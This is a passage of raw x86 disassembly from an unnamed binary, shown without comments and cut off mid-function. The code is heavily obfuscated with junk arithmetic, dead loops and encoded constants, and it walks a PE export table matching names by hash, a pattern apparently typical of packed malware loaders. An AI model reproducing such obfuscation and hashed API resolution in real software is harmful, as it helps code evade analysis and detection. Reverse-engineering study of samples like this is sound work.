  41ddc1:	cmp    DWORD PTR ds:0x42a40a,0xe
  41ddc8:	jbe    0x41de02
  41ddce:	jmp    0x41dde3
  41ddd3:	push   0x42a442
  41ddd8:	push   0x4291d1
  41dddd:	call   DWORD PTR ds:0x42a542
  41dde3:	cmp    DWORD PTR ds:0x42a40a,0xd
  41ddea:	jne    0x41ddfd
  41ddf0:	mov    edx,DWORD PTR ds:0x42a40a
  41ddf6:	inc    edx
  41ddf7:	mov    DWORD PTR ds:0x42a40a,edx
  41ddfd:	jmp    0x41dda7
  41de02:	mov    DWORD PTR [ebp-0x14],eax
  41de05:	mov    eax,DWORD PTR [ebp-0xc]
  41de08:	mov    edx,DWORD PTR [ebp-0x14]
  41de0b:	add    DWORD PTR ds:0x42a3ba,0x2e29
  41de15:	mov    ecx,0x75108a8
  41de1a:	sbb    DWORD PTR ds:0x42a3c2,0x6ecf
  41de24:	xor    eax,ecx
  41de26:	sub    DWORD PTR ds:0x42a3a6,0x42a3ea
  41de30:	add    eax,0x3272ef
  41de35:	mov    DWORD PTR [edx],eax
  41de37:	mov    eax,ds:0x429296
  41de3c:	and    DWORD PTR ds:0x42a416,0x0
  41de46:	mov    edx,DWORD PTR ds:0x42a416
  41de4c:	inc    edx
  41de4d:	mov    DWORD PTR ds:0x42a416,edx
  41de53:	cmp    DWORD PTR ds:0x42a416,0x5
  41de5a:	jge    0x41de9f
  41de60:	jmp    0x41de78
  41de65:	push   DWORD PTR [ebp-0x1c]
  41de68:	push   0x42919f
  41de6d:	push   0x429153
  41de72:	call   DWORD PTR ds:0x42a506
  41de78:	cmp    DWORD PTR ds:0x42a416,0x4
  41de7f:	jne    0x41de92
  41de85:	mov    edx,DWORD PTR ds:0x42a416
  41de8b:	inc    edx
  41de8c:	mov    DWORD PTR ds:0x42a416,edx
  41de92:	cmp    DWORD PTR ds:0x42a416,0x1a
  41de99:	jb     0x41de46
  41de9f:	mov    edx,DWORD PTR [ebp-0x4]
  41dea2:	mov    eax,DWORD PTR [eax]
  41dea4:	add    eax,DWORD PTR [edx]
  41dea6:	sbb    edx,DWORD PTR ds:0x42a3fa
  41deac:	push   esi
  41dead:	adc    DWORD PTR ds:0x42a3ba,0x287e
  41deb7:	mov    DWORD PTR [ebp-0x8],eax
  41deba:	adc    esi,esi
  41debc:	mov    edx,DWORD PTR [ebp+0x8]
  41debf:	mov    eax,ds:0x42941e
  41dec4:	xor    DWORD PTR ds:0x42a406,0x51ed
  41dece:	mov    eax,DWORD PTR [eax+0x198]
  41ded4:	and    DWORD PTR ds:0x42a3fe,0x0
  41dede:	mov    esi,DWORD PTR ds:0x42a3fe
  41dee4:	inc    esi
  41dee5:	mov    DWORD PTR ds:0x42a3fe,esi
  41deeb:	cmp    DWORD PTR ds:0x42a3fe,0x1b
  41def2:	jle    0x41df22
  41def8:	jmp    0x41df15
  41defd:	push   0x659e
  41df02:	push   0x42a3ba
  41df07:	push   0x7425
  41df0c:	push   DWORD PTR [ebp-0x28]
  41df0f:	call   DWORD PTR ds:0x42a546
  41df15:	cmp    DWORD PTR ds:0x42a3fe,0x12
  41df1c:	jb     0x41dede
  41df22:	xor    edx,ecx
  41df24:	mov    esi,0x3272ef
  41df29:	and    DWORD PTR ds:0x42a3fa,0x1b88
  41df33:	add    edx,esi
  41df35:	cmp    DWORD PTR [eax],edx
  41df37:	mov    DWORD PTR ds:0x42a3b2,0x5220
  41df41:	je     0x41df4e
  41df47:	mov    eax,DWORD PTR [eax]
  41df49:	jmp    0x41e3e2
  41df4e:	and    DWORD PTR ds:0x42a44e,0x0
  41df58:	mov    eax,ds:0x42a44e
  41df5d:	inc    eax
  41df5e:	mov    ds:0x42a44e,eax
  41df63:	cmp    DWORD PTR ds:0x42a44e,0xd
  41df6a:	jg     0x41dfa8
  41df70:	jmp    0x41df83
  41df75:	push   DWORD PTR [ebp-0x14]
  41df78:	push   0x42a41e
  41df7d:	call   DWORD PTR ds:0x42a54a
  41df83:	cmp    DWORD PTR ds:0x42a44e,0xc
  41df8a:	jne    0x41df9b
  41df90:	mov    eax,ds:0x42a44e
  41df95:	inc    eax
  41df96:	mov    ds:0x42a44e,eax
  41df9b:	cmp    DWORD PTR ds:0x42a44e,0x17
  41dfa2:	jb     0x41df58
  41dfa8:	mov    eax,DWORD PTR [ebp+0x18]
  41dfab:	sub    DWORD PTR ds:0x42a42e,0x5c9e
  41dfb5:	xor    eax,ecx
  41dfb7:	push   ebx
  41dfb8:	sbb    ebx,0x56df
  41dfbe:	add    eax,esi
  41dfc0:	add    ebx,DWORD PTR ds:0x42a41a
  41dfc6:	xor    edx,edx
  41dfc8:	mov    ebx,0xfabdbeda
  41dfcd:	add    eax,ebx
  41dfcf:	push   edi
  41dfd0:	mov    edi,0x286f
  41dfd5:	adc    edx,0xffffffff
  41dfd8:	mov    edi,0x8a29a13b
  41dfdd:	xor    eax,edi
  41dfdf:	mov    DWORD PTR ds:0x42a43a,0x59ae
  41dfe9:	xor    edx,0x0
  41dfec:	mov    DWORD PTR ds:0x42a426,0x4720
  41dff6:	cmp    eax,0x70941fe1
  41dffb:	jne    0x41e032
  41e001:	mov    DWORD PTR ds:0x42a406,0x4be9
  41e00b:	cmp    edx,0xffffffff
  41e00e:	jne    0x41e032
  41e014:	mov    DWORD PTR ds:0x42a43a,0x6dae
  41e01e:	push   0xf89c85ba
  41e023:	mov    DWORD PTR ds:0x42a42a,0x1950
  41e02d:	jmp    0x41e3cf
  41e032:	sbb    eax,DWORD PTR ds:0x42a3e6
  41e038:	mov    eax,DWORD PTR [ebp+0x18]
  41e03b:	xor    eax,ecx
  41e03d:	adc    DWORD PTR ds:0x42a436,0x42a402
  41e047:	add    eax,esi
  41e049:	xor    edx,edx
  41e04b:	dec    DWORD PTR ds:0x42a3fa
  41e051:	add    eax,ebx
  41e053:	mov    DWORD PTR ds:0x42a3b2,0x604
  41e05d:	adc    edx,0xffffffff
  41e060:	adc    DWORD PTR ds:0x42a3ae,0x42a40e
  41e06a:	xor    eax,edi
  41e06c:	xor    edx,0x0
  41e06f:	mov    DWORD PTR ds:0x42a3ca,0x4b6d
  41e079:	cmp    eax,0x70941fe7
  41e07e:	mov    DWORD PTR ds:0x42a40e,0x342
  41e088:	jne    0x41e3bc
  41e08e:	mov    DWORD PTR ds:0x42a41a,0x69f4
  41e098:	cmp    edx,0xffffffff
  41e09b:	jne    0x41e3bc
  41e0a1:	and    edx,eax
  41e0a3:	mov    eax,DWORD PTR [ebp+0x10]
  41e0a6:	inc    edx
  41e0a7:	xor    eax,ecx
  41e0a9:	movzx  edx,BYTE PTR ds:0x42a3f2
  41e0b0:	and    DWORD PTR ds:0x42a43e,edx
  41e0b6:	add    eax,esi
  41e0b8:	sub    DWORD PTR ds:0x42a452,0x2e10
  41e0c2:	mov    DWORD PTR [ebp-0x18],eax
  41e0c5:	xor    DWORD PTR ds:0x42a416,ebx
  41e0cb:	mov    eax,DWORD PTR [ebp+0xc]
  41e0ce:	mov    edx,DWORD PTR ds:0x42a3ce
  41e0d4:	and    DWORD PTR ds:0x42a43e,edx
  41e0da:	mov    edx,DWORD PTR [ebp-0x8]
  41e0dd:	or     DWORD PTR ds:0x42a416,0x42a43a
  41e0e7:	xor    eax,ecx
  41e0e9:	xor    DWORD PTR ds:0x42a3f2,0x2c59
  41e0f3:	add    eax,esi
  41e0f5:	add    DWORD PTR ds:0x42a3aa,0x1203
  41e0ff:	imul   eax,DWORD PTR [edx]
  41e102:	mov    edx,DWORD PTR [ebp+0x8]
  41e105:	xor    edx,ecx
  41e107:	add    edx,esi
  41e109:	mov    DWORD PTR ds:0x42a3d6,0x15dc
  41e113:	cmp    edx,eax
  41e115:	mov    eax,DWORD PTR [ebp-0x4]
  41e118:	mov    DWORD PTR ds:0x42a41a,0x25f0
  41e122:	je     0x41e1f0
  41e128:	xor    DWORD PTR ds:0x42a432,edi
  41e12e:	mov    edx,DWORD PTR [ebp-0x18]
  41e131:	and    DWORD PTR ds:0x42a3aa,0x42a3e6
  41e13b:	add    DWORD PTR [eax],edx
  41e13d:	mov    eax,DWORD PTR [ebp-0x4]
  41e140:	sbb    edx,0x41ab
  41e146:	mov    edx,DWORD PTR [ebp+0xc]
  41e149:	or     DWORD PTR ds:0x42a3e6,0x42a3b2
  41e153:	xor    edx,ecx
  41e155:	and    DWORD PTR ds:0x42a3b2,0x1b9a
  41e15f:	add    edx,esi
  41e161:	imul   edx,DWORD PTR [eax]
  41e164:	mov    DWORD PTR ds:0x42a446,0x43e8
  41e16e:	mov    DWORD PTR [eax],edx
  41e170:	mov    eax,DWORD PTR [ebp-0x4]
  41e173:	and    DWORD PTR ds:0x42a402,0x0
  41e17d:	mov    edx,DWORD PTR ds:0x42a402
  41e183:	inc    edx
  41e184:	mov    DWORD PTR ds:0x42a402,edx
  41e18a:	cmp    DWORD PTR ds:0x42a402,0x8
  41e191:	jle    0x41e1d3
  41e197:	jmp    0x41e1aa
  41e19c:	push   0x4291e3
  41e1a1:	push   DWORD PTR [ebp-0x28]
  41e1a4:	call   DWORD PTR ds:0x42a50a
  41e1aa:	cmp    DWORD PTR ds:0x42a402,0x7
  41e1b1:	jne    0x41e1c6
  41e1b7:	xor    edx,edx
  41e1b9:	or     edx,DWORD PTR ds:0x42a402
  41e1bf:	inc    edx
  41e1c0:	mov    DWORD PTR ds:0x42a402,edx
  41e1c6:	cmp    DWORD PTR ds:0x42a402,0x1f
  41e1cd:	jb     0x41e17d
  41e1d3:	mov    DWORD PTR [ebp-0x1c],eax
  41e1d6:	not    DWORD PTR ds:0x42a422
  41e1dc:	mov    eax,DWORD PTR [ebp+0x10]
  41e1df:	xor    eax,ecx
  41e1e1:	mov    edx,0xffcd8d11
  41e1e6:	sub    edx,eax
  41e1e8:	mov    eax,DWORD PTR [ebp-0x1c]
  41e1eb:	jmp    0x41e253
  41e1f0:	mov    edx,DWORD PTR [ebp+0x14]
  41e1f3:	xor    DWORD PTR [eax],edx
  41e1f5:	mov    DWORD PTR ds:0x42a3fa,0x16
  41e1ff:	cmp    DWORD PTR ds:0x42a3fa,0x0
  41e206:	je     0x41e23e
  41e20c:	cmp    DWORD PTR ds:0x42a3fa,0x25
  41e213:	jbe    0x41e23e
  41e219:	jmp    0x41e22e
  41e21e:	push   0x5d62
  41e223:	push   0x42a3c2
  41e228:	call   DWORD PTR ds:0x42a55a
  41e22e:	mov    eax,ds:0x42a3fa
  41e233:	dec    eax
  41e234:	mov    ds:0x42a3fa,eax
  41e239:	jmp    0x41e1ff
  41e23e:	mov    eax,DWORD PTR [ebp-0x4]
  41e241:	mov    DWORD PTR [ebp-0x1c],eax
  41e244:	mov    eax,DWORD PTR [ebp+0x10]
  41e247:	xor    eax,ecx
  41e249:	mov    edx,0xffcd8d11
  41e24e:	sub    edx,eax
  41e250:	mov    eax,DWORD PTR [ebp-0x1c]
  41e253:	add    DWORD PTR [eax],edx
  41e255:	mov    eax,DWORD PTR [ebp-0x4]
  41e258:	mov    edx,DWORD PTR [ebp-0x8]
  41e25b:	add    edx,DWORD PTR [eax]
  41e25d:	mov    DWORD PTR [ebp-0x8],edx
  41e260:	mov    eax,DWORD PTR [ebp+0xc]
  41e263:	mov    edx,DWORD PTR [ebp+0xc]
  41e266:	xor    edx,ecx
  41e268:	xor    eax,ecx
  41e26a:	lea    eax,[eax+edx*1+0x64e5de]
  41e271:	mov    edx,DWORD PTR [ebp+0xc]
  41e274:	xor    edx,ecx
  41e276:	add    edx,esi
  41e278:	imul   eax,edx
  41e27b:	mov    edx,DWORD PTR [ebp+0xc]
  41e27e:	xor    edx,ecx
  41e280:	sub    edx,eax
  41e282:	mov    eax,DWORD PTR [ebp-0x4]
  41e285:	add    edx,esi
  41e287:	cmp    DWORD PTR [eax],edx
  41e289:	mov    eax,DWORD PTR [ebp-0x4]
  41e28c:	jg     0x41e2a9
  41e292:	mov    DWORD PTR [ebp-0x1c],eax
  41e295:	mov    eax,DWORD PTR [ebp+0x10]
  41e298:	xor    eax,ecx
  41e29a:	mov    edx,0xffcd8d11
  41e29f:	sub    edx,eax
  41e2a1:	mov    eax,DWORD PTR [ebp-0x1c]
  41e2a4:	jmp    0x41e2b0
  41e2a9:	mov    edx,DWORD PTR [ebp+0x10]
  41e2ac:	xor    edx,ecx
  41e2ae:	add    edx,esi
  41e2b0:	add    DWORD PTR [eax],edx
  41e2b2:	mov    eax,DWORD PTR [ebp-0x8]
  41e2b5:	mov    edx,DWORD PTR [ebp-0x10]
  41e2b8:	mov    eax,DWORD PTR [eax]
  41e2ba:	xor    edx,ecx
  41e2bc:	add    edx,0x3272ee
  41e2c2:	not    edx
  41e2c4:	and    eax,edx
  41e2c6:	mov    DWORD PTR [ebp-0x4],eax
  41e2c9:	movsx  eax,BYTE PTR [eax+0x1]
  41e2cd:	cdq    
  41e2ce:	add    eax,ebx
  41e2d0:	adc    edx,0xffffffff
  41e2d3:	xor    eax,edi
  41e2d5:	xor    edx,0x0
  41e2d8:	cmp    eax,0x70941e0f
  41e2dd:	jne    0x41e311
  41e2e3:	cmp    edx,0xffffffff
  41e2e6:	jne    0x41e311
  41e2ec:	mov    eax,DWORD PTR [ebp-0x4]
  41e2ef:	movsx  eax,BYTE PTR [eax]
  41e2f2:	cdq    
  41e2f3:	add    eax,ebx
  41e2f5:	adc    edx,0xffffffff
  41e2f8:	xor    eax,edi
  41e2fa:	xor    edx,0x0
  41e2fd:	cmp    eax,0x70941e1c
  41e302:	jne    0x41e311
  41e308:	cmp    edx,0xffffffff
  41e30b:	je     0x41e328
  41e311:	mov    eax,DWORD PTR [ebp-0x10]
  41e314:	xor    eax,ecx
  41e316:	mov    edx,0xffcd8d11
  41e31b:	sub    edx,eax
  41e31d:	add    DWORD PTR [ebp-0x4],edx
  41e320:	mov    eax,DWORD PTR [ebp-0x4]
  41e323:	jmp    0x41e2c9
  41e328:	mov    eax,DWORD PTR [ebp-0x14]
  41e32b:	mov    eax,DWORD PTR [eax]
  41e32d:	mov    edx,DWORD PTR [ebp-0x4]
  41e330:	mov    edx,DWORD PTR [edx+0x3c]
  41e333:	lea    eax,[edx+eax*8+0x78]
  41e337:	mov    edx,DWORD PTR [ebp-0x4]
  41e33a:	mov    eax,DWORD PTR [eax+edx*1]
  41e33d:	mov    DWORD PTR [ebp-0x8],eax
  41e340:	mov    eax,DWORD PTR [ebp+0x8]
  41e343:	xor    eax,ecx
  41e345:	add    eax,esi
  41e347:	mov    DWORD PTR [ebp-0x14],eax
  41e34a:	mov    eax,DWORD PTR [ebp+0x8]
  41e34d:	mov    edx,DWORD PTR [ebp-0x8]
  41e350:	xor    eax,ecx
  41e352:	add    eax,esi
  41e354:	cmp    edx,eax
  41e356:	jne    0x41e374
  41e35c:	mov    eax,DWORD PTR [ebp+0xc]
  41e35f:	xor    eax,ecx
  41e361:	mov    ecx,DWORD PTR [ebp-0x8]
  41e364:	add    eax,esi
  41e366:	imul   eax,ecx
  41e369:	mov    DWORD PTR [ebp-0x8],eax
  41e36c:	push   DWORD PTR [ebp+0x18]
  41e36f:	jmp    0x41e3cf
  41e374:	mov    eax,DWORD PTR [ebp-0x8]
  41e377:	mov    ecx,DWORD PTR [ebp-0x4]
  41e37a:	add    eax,ecx
  41e37c:	mov    DWORD PTR [ebp-0x14],eax
  41e37f:	mov    eax,DWORD PTR [ebp-0x14]
  41e382:	mov    eax,DWORD PTR [eax+0xc]
  41e385:	movsx  eax,BYTE PTR [eax+ecx*1]
  41e389:	cdq    
  41e38a:	add    eax,ebx
  41e38c:	adc    edx,0xffffffff
  41e38f:	xor    eax,edi
  41e391:	xor    edx,0x0
  41e394:	cmp    eax,0x70941e1e
  41e399:	jne    0x41e36c
  41e39f:	cmp    edx,0xffffffff
  41e3a2:	jne    0x41e36c
  41e3a8:	mov    eax,ds:0x42941e
  41e3ad:	mov    eax,DWORD PTR [eax+0x198]
  41e3b3:	mov    DWORD PTR [eax],ecx
  41e3b5:	mov    eax,ecx
  41e3b7:	jmp    0x41e3e0
  41e3bc:	mov    eax,DWORD PTR [ebp+0x18]
  41e3bf:	cmp    eax,0xf89c85ba
  41e3c4:	jne    0x41e3e0
  41e3ca:	push   0xf89c85bb
  41e3cf:	push   DWORD PTR [ebp+0x14]
  41e3d2:	push   DWORD PTR [ebp+0x10]
  41e3d5:	push   DWORD PTR [ebp+0xc]
  41e3d8:	push   DWORD PTR [ebp+0x8]
  41e3db:	call   0x41dd69
  41e3e0:	pop    edi
  41e3e1:	pop    ebx
  41e3e2:	pop    esi
  41e3e3:	leave  
  41e3e4:	ret    0x14
  41e3e7:	push   ebp
  41e3e8:	mov    ebp,esp
  41e3ea:	sub    esp,0x68
  41e3ed:	add    DWORD PTR ds:0x42a43e,0x42a42a
  41e3f7:	push   esi
  41e3f8:	push   edi
  41e3f9:	xor    edi,edi
  41e3fb:	mov    DWORD PTR ds:0x42a3de,0x573c
  41e405:	push   edi
  41e406:	call   DWORD PTR ds:0x42a522
  41e40c:	mov    esi,DWORD PTR ds:0x42a552
  41e412:	not    DWORD PTR ds:0x42a40e
  41e418:	push   0xf
  41e41a:	mov    DWORD PTR [ebp-0x14],eax
  41e41d:	add    DWORD PTR ds:0x42a3ca,0x7d28
  41e427:	lea    eax,[ebp-0x68]
  41e42a:	and    DWORD PTR ds:0x42a402,0x1edb
  41e434:	push   eax
  41e435:	push   0x429542
  41e43a:	sub    DWORD PTR ds:0x42a41a,0x42a406
  41e444:	push   0x42955e
  41e449:	push   0x42958e
  41e44e:	sbb    DWORD PTR ds:0x42a3fe,0x7a6
  41e458:	call   esi
  41e45a:	mov    DWORD PTR ds:0x42a3a6,0x73eb
  41e464:	shl    eax,0x15
  41e467:	mov    DWORD PTR ds:0x42a3ba,0x2439
  41e471:	cmp    eax,0x1800000
  41e476:	je     0x41e48d
  41e47c:	xor    eax,eax
  41e47e:	mov    DWORD PTR ds:0x42a3ae,0x1037
  41e488:	jmp    0x41f43c
  41e48d:	or     DWORD PTR ds:0x42a406,0x42a3a6
  41e497:	push   0x4295b6
  41e49c:	call   DWORD PTR ds:0x42a54e
  41e4a2:	xor    DWORD PTR ds:0x42a3da,0x42a432
  41e4ac:	test   eax,eax
  41e4ae:	mov    DWORD PTR ds:0x42a3b6,0x194e
  41e4b8:	jne    0x41e47c
  41e4be:	push   0x4295ee
  41e4c3:	xor    DWORD PTR ds:0x42a3f2,0x42a3d6
  41e4cd:	call   DWORD PTR ds:0x42a556
  41e4d3:	test   eax,eax
  41e4d5:	mov    DWORD PTR ds:0x42a432,0x7c0b
  41e4df:	jne    0x41e47c
  41e4e5:	or     DWORD PTR ds:0x42a42e,0x6f8e
  41e4ef:	push   ebx
  41e4f0:	mov    DWORD PTR ds:0x42a41a,0xfae
  41e4fa:	push   DWORD PTR [ebp-0x14]
  41e4fd:	add    DWORD PTR ds:0x42a3d6,0x42a3ee
  41e507:	push   edi
  41e508:	sbb    DWORD PTR ds:0x42a442,0x76dd
  41e512:	call   DWORD PTR ds:0x42a536
  41e518:	mov    ecx,DWORD PTR ds:0x42a4ce
  41e51e:	mov    ebx,DWORD PTR ds:0x42a4e6
  41e524:	sub    ecx,ebx
  41e526:	sub    ecx,DWORD PTR [ecx+ebx*1]
  41e529:	mov    DWORD PTR [ebp-0x2c],edi
  41e52c:	or     DWORD PTR ds:0x42a3ee,0x565
  41e536:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41e53d:	mov    DWORD PTR ds:0x42a3c2,0x78c3
  41e547:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  41e54e:	or     ebx,ecx
  41e550:	lea    eax,[ebp-0x20]
  41e553:	mov    DWORD PTR [ebp-0x2c],eax
  41e556:	add    ebx,edi
  41e558:	lea    eax,[ebp-0x1c]
  41e55b:	mov    edi,DWORD PTR ds:0x42a462
  41e561:	mov    ecx,DWORD PTR ds:0x42a49e
  41e567:	sub    edi,ecx
  41e569:	and    edi,DWORD PTR [edi+ecx*1]
  41e56c:	mov    DWORD PTR [ebp-0x14],eax
  41e56f:	and    DWORD PTR ds:0x42a3fa,0x5d3c
  41e579:	mov    eax,ds:0x42941e
  41e57e:	xor    ebx,ebx
  41e580:	xor    ebx,DWORD PTR ds:0x42a40a
  41e586:	sbb    DWORD PTR ds:0x42a43e,ebx
  41e58c:	mov    eax,DWORD PTR [eax+0x1c8]
  41e592:	sbb    edi,DWORD PTR ds:0x42a44e
  41e598:	mov    eax,DWORD PTR [eax]
  41e59a:	and    DWORD PTR ds:0x42a3f2,0x0
  41e5a4:	mov    edi,DWORD PTR ds:0x42a3f2
  41e5aa:	inc    edi
  41e5ab:	mov    DWORD PTR ds:0x42a3f2,edi
  41e5b1:	cmp    DWORD PTR ds:0x42a3f2,0xf
  41e5b8:	jl     0x41e5fe
  41e5be:	jmp    0x41e5d7
  41e5c3:	push   DWORD PTR [ebp-0x1c]
  41e5c6:	push   DWORD PTR [ebp-0x1c]
  41e5c9:	push   DWORD PTR [ebp-0xc]
  41e5cc:	push   0x53e0
  41e5d1:	call   DWORD PTR ds:0x42a50e
  41e5d7:	cmp    DWORD PTR ds:0x42a3f2,0xe
  41e5de:	jne    0x41e5f1
  41e5e4:	mov    edi,DWORD PTR ds:0x42a3f2
  41e5ea:	inc    edi
  41e5eb:	mov    DWORD PTR ds:0x42a3f2,edi
  41e5f1:	cmp    DWORD PTR ds:0x42a3f2,0x1d
  41e5f8:	jb     0x41e5a4
  41e5fe:	mov    ecx,DWORD PTR [ebp-0x14]
  41e601:	and    ebx,DWORD PTR ds:0x42a42a
  41e607:	mov    edi,0x75108a8
  41e60c:	xor    ebx,DWORD PTR ds:0x42a3f2
  41e612:	xor    eax,edi
  41e614:	mov    ebx,DWORD PTR ds:0x42a40a
  41e61a:	or     DWORD PTR ds:0x42a3be,ebx
  41e620:	mov    ebx,0x3272ef
  41e625:	add    eax,ebx
  41e627:	mov    DWORD PTR ds:0x42a442,0x4871
  41e631:	mov    DWORD PTR [ecx],eax
  41e633:	mov    eax,ds:0x42a412
  41e638:	mov    eax,ds:0x42a25a
  41e63d:	cmp    eax,0x445cecf9
  41e642:	jne    0x41e6bf
  41e648:	sbb    ecx,0x3851
  41e64e:	mov    eax,DWORD PTR [ebp-0x4]
  41e651:	sub    DWORD PTR ds:0x42a3ea,edi
  41e657:	mov    ecx,DWORD PTR ds:0x42941e
  41e65d:	mov    ecx,DWORD PTR [ecx+0x198]
  41e663:	adc    DWORD PTR ds:0x42a3ca,0x1545
  41e66d:	xor    eax,edi
  41e66f:	add    eax,ebx
  41e671:	mov    DWORD PTR [ecx],eax
  41e673:	xor    eax,DWORD PTR ds:0x42a41e
  41e679:	mov    eax,DWORD PTR [ebp-0x4]
  41e67c:	sub    DWORD PTR ds:0x42a3be,0x2657
  41e686:	xor    eax,edi
  41e688:	add    eax,ebx
  41e68a:	mov    ds:0x42a25a,eax
  41e68f:	dec    DWORD PTR ds:0x42a40a
  41e695:	mov    eax,DWORD PTR [ebp-0x4]
  41e698:	xor    DWORD PTR ds:0x42a3da,0x42a42e
  41e6a2:	xor    eax,edi
  41e6a4:	sbb    DWORD PTR ds:0x42a3d6,0xceb
  41e6ae:	add    eax,ebx
  41e6b0:	sbb    DWORD PTR ds:0x42a3f6,0x42a41e
  41e6ba:	mov    ds:0x429516,eax
  41e6bf:	sub    eax,0xfb3
  41e6c4:	mov    eax,ds:0x42941e
  41e6c9:	not    DWORD PTR ds:0x42a422
  41e6cf:	mov    eax,DWORD PTR [eax+0x18c]
  41e6d5:	sub    DWORD PTR ds:0x42a3b2,0x42a41a
  41e6df:	mov    eax,DWORD PTR [eax]
  41e6e1:	not    DWORD PTR ds:0x42a3b2
  41e6e7:	mov    DWORD PTR [ebp-0x34],eax
  41e6ea:	adc    DWORD PTR ds:0x42a446,0x42a42e
  41e6f4:	mov    eax,0xf89c85bd
  41e6f9:	mov    DWORD PTR [ebp-0x24],eax
  41e6fc:	sbb    DWORD PTR ds:0x42a3fe,0x42a3f6
  41e706:	mov    DWORD PTR [ebp-0x24],eax
  41e709:	sub    DWORD PTR ds:0x42a3c2,0x5dcc
  41e713:	mov    DWORD PTR [ebp-0x24],eax
  41e716:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41e71d:	sbb    DWORD PTR ds:0x42a422,0x2005
  41e727:	mov    DWORD PTR [ebp-0x14],eax
  41e72a:	mov    DWORD PTR ds:0x42a426,0x202e
  41e734:	mov    DWORD PTR [ebp-0x14],0xf89c85b1
  41e73b:	mov    eax,DWORD PTR [ebp-0x4]
  41e73e:	add    DWORD PTR ds:0x42a406,0x42a41e
  41e748:	xor    eax,edi
  41e74a:	or     DWORD PTR ds:0x42a3da,0x42a3e2
  41e754:	add    eax,ebx
  41e756:	jmp    0x41e89f
  41e75b:	dec    DWORD PTR ds:0x42a3c2
  41e761:	lea    eax,[ebp-0x68]
  41e764:	adc    DWORD PTR ds:0x42a3ee,0x2f79
  41e76e:	push   eax
  41e76f:	xor    DWORD PTR ds:0x42a3ba,0x2364
  41e779:	push   0x429606
  41e77e:	push   0x429622
  41e783:	push   0x429652
  41e788:	sub    DWORD PTR ds:0x42a3ea,0x2bd1
  41e792:	call   esi
  41e794:	mov    DWORD PTR ds:0x42a3c6,0x6294
  41e79e:	shl    eax,0x15
  41e7a1:	cmp    eax,0x1800000
  41e7a6:	jne    0x41f419
  41e7ac:	dec    DWORD PTR ds:0x42a3e2
  41e7b2:	push   0x42967a
  41e7b7:	adc    DWORD PTR ds:0x42a44a,0x42a42e
  41e7c1:	call   DWORD PTR ds:0x42a54e
  41e7c7:	add    DWORD PTR ds:0x42a3ca,0x6241
  41e7d1:	test   eax,eax
  41e7d3:	jne    0x41f419
  41e7d9:	or     DWORD PTR ds:0x42a3b2,0x259a
  41e7e3:	push   0x4296b2
  41e7e8:	call   DWORD PTR ds:0x42a556
  41e7ee:	test   eax,eax
  41e7f0:	mov    DWORD PTR ds:0x42a3aa,0x7610
  41e7fa:	jne    0x41f419
  41e800:	mov    DWORD PTR ds:0x42a446,0x3430
  41e80a:	mov    eax,DWORD PTR [ebp-0x8]
  41e80d:	mov    ecx,DWORD PTR [ebp-0x14]
  41e810:	xor    eax,edi
  41e812:	add    DWORD PTR ds:0x42a3b6,0x3941
  41e81c:	lea    eax,[eax+ecx*1+0x3272ef]
  41e823:	or     DWORD PTR ds:0x42a43e,0x42a446
  41e82d:	push   eax
  41e82e:	mov    eax,DWORD PTR [ebp-0x24]
  41e831:	sbb    DWORD PTR ds:0x42a3ee,0x42a422
  41e83b:	xor    eax,edi
  41e83d:	lea    eax,[ebp+eax*1+0x3272f7]
  41e844:	push   eax
  41e845:	and    eax,DWORD PTR ds:0x42a3ba
  41e84b:	mov    eax,ds:0x42941e
  41e850:	sbb    DWORD PTR ds:0x42a41a,0x42a43a
  41e85a:	push   DWORD PTR [eax+0x1bc]
  41e860:	add    DWORD PTR ds:0x42a3e6,0x42a442
  41e86a:	call   0x41f442
  41e86f:	adc    DWORD PTR ds:0x42a3c6,0x3c17
  41e879:	mov    eax,DWORD PTR [ebp-0x8]
  41e87c:	and    DWORD PTR ds:0x42a40a,0x7df0
  41e886:	mov    ecx,DWORD PTR [ebp-0x14]
  41e889:	movzx  edx,BYTE PTR ds:0x42a3aa
  41e890:	sub    DWORD PTR ds:0x42a42a,edx
  41e896:	xor    eax,edi
  41e898:	lea    eax,[ecx+eax*1+0x3272ef]
  41e89f:	sub    DWORD PTR ds:0x42a3aa,edi
  41e8a5:	mov    ecx,DWORD PTR [ebp-0x8]
  41e8a8:	mov    edx,DWORD PTR [ebp-0x8]
  41e8ab:	inc    DWORD PTR ds:0x42a442
  41e8b1:	xor    edx,edi
  41e8b3:	add    DWORD PTR ds:0x42a40e,0x340b
  41e8bd:	xor    ecx,edi
  41e8bf:	add    ecx,edx
  41e8c1:	and    DWORD PTR ds:0x42a412,0x0
  41e8cb:	mov    edx,DWORD PTR ds:0x42a412
  41e8d1:	inc    edx
  41e8d2:	mov    DWORD PTR ds:0x42a412,edx
  41e8d8:	cmp    DWORD PTR ds:0x42a412,0x23
  41e8df:	jge    0x41e903
  41e8e5:	jmp    0x41e8f6
  41e8ea:	push   DWORD PTR [ebp-0x1c]
  41e8ed:	push   DWORD PTR [ebp-0x1c]
  41e8f0:	call   DWORD PTR ds:0x42a512
  41e8f6:	cmp    DWORD PTR ds:0x42a412,0x1c
  41e8fd:	jb     0x41e8cb
  41e903:	mov    edx,DWORD PTR [ebp-0x8]
  41e906:	sub    DWORD PTR ds:0x42a42a,0x42a446
  41e910:	xor    edx,edi
  41e912:	lea    ecx,[ecx+edx*1+0x9758cd]
  41e919:	mov    DWORD PTR ds:0x42a3c2,0x75f2
  41e923:	mov    DWORD PTR [ebp-0x14],eax
  41e926:	push   0xf
  41e928:	cmp    eax,ecx
  41e92a:	mov    DWORD PTR ds:0x42a3de,0x7e75
  41e934:	jbe    0x41e75b
  41e93a:	sub    ecx,0x81d
  41e940:	mov    eax,DWORD PTR [ebp+0xc]
  41e943:	xor    ecx,ecx
  41e945:	xor    ecx,DWORD PTR ds:0x42a3ce
  41e94b:	add    DWORD PTR ds:0x42a3e6,ecx
  41e951:	mov    ds:0x4292a2,eax
  41e956:	and    DWORD PTR ds:0x42a3b6,0x0
  41e960:	jmp    0x41e970
  41e965:	mov    eax,ds:0x42a3b6
  41e96a:	inc    eax
  41e96b:	mov    ds:0x42a3b6,eax
  41e970:	cmp    DWORD PTR ds:0x42a3b6,0x1a
  41e977:	jae    0x41e9a9
  41e97d:	cmp    DWORD PTR ds:0x42a3b6,0x1c
  41e984:	jl     0x41e9a9
  41e98a:	jmp    0x41e9a4
  41e98f:	push   0x202a
  41e994:	push   0x8d25
  41e999:	push   0x4dd2
